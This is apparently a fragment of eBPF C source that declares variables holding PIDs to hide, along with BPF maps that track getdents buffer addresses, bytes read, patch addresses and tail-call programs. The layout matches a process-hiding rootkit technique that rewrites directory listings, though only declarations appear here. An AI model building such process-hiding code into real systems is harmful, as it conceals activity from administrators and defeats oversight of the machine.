#define PROG_01 1
#define MAX_PID_LEN 8
#define MAX_PID_NUM 1
// const u32 MAX_PID_LEN = 10;
// const u32 MAX_PID_NUM = 5;
/*const volatile u32 pid_to_hide_len[MAX_PID_NUM];
const volatile u8 pid_to_hide[MAX_PID_NUM][MAX_PID_LEN];
const volatile u32 pidNum;*/
volatile u32 pidToHideLen[MAX_PID_NUM] = {0};
volatile u8 pidToHide[MAX_PID_NUM][MAX_PID_LEN] = {0};
volatile u32 pidNum = 0;

// Map to fold the dents buffer addresses
struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, 8192);
  __type(key, pid_t);
  __type(value, long unsigned int);
} bufMap SEC(".maps");

struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, 8192);
  __type(key, pid_t);
  __type(value, u32);
} bytesReadMap SEC(".maps");

// Map with address of actual
struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, 8192);
  __type(key, pid_t);
  __type(value, long unsigned int);
} patchMap SEC(".maps");

struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, 8192);
  __type(key, pid_t);
  __type(value, u32);
} pidIndexMap SEC(".maps");

// Map to hold program tail calls
struct {
  __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
  __uint(max_entries, 5);
  __type(key, __u32);
  __type(value, __u32);
} progArrayMap SEC(".maps");
